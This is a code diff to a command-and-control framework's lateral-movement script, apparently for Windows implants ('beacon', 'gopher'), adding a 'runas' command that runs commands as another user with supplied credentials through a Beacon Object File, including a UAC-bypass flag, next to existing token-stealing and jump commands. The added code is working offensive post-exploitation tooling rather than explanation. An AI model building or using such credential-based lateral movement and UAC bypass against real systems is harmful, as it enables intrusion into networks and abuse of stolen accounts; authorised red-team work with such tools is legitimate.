@@ -155,7 +155,35 @@ cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);
 
 
 
-var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token]);
+var cmd_runas = ax.create_command("runas", "Run a command as another user using explicit credentials (RunasCs-like)", "runas admin P@ssword domain.local \"cmd /c whoami\" -l 9 -t 30000 -o -b");
+cmd_runas.addArgString("username", true, "Username for authentication");
+cmd_runas.addArgString("password", true, "Password for authentication");
+cmd_runas.addArgString("domain", true, "Domain (use '.' for local)");
+cmd_runas.addArgString("command", true, "Command line to execute");
+cmd_runas.addArgFlagInt("-l", "logon_type", "Logon type: 2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials", 2);
+cmd_runas.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for process output (default: 120000)", 0);
+cmd_runas.addArgBool("-o", "With output capture");
+cmd_runas.addArgBool("-b", "Bypass UAC (use with admin credentials)");
+cmd_runas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let username   = parsed_json["username"];
+    let password   = parsed_json["password"];
+    let domain     = parsed_json["domain"];
+    let command    = parsed_json["command"];
+    let logon_type = parsed_json["logon_type"];
+    let timeout    = parsed_json["timeout"];
+    let no_output  = parsed_json["-o"] ? 0 : 1;
+    let bypass_uac = parsed_json["-b"] ? 1 : 0;
+
+    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,int,int,int,int", [username, password, domain, command, logon_type, timeout, no_output, bypass_uac]);
+    let bof_path = ax.script_dir() + "_bin/runas." + ax.arch(id) + ".o";
+    let message = `Task: runas ${domain}\\${username} -> '${command}'`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
+var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token, cmd_runas]);
 ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);
 
 
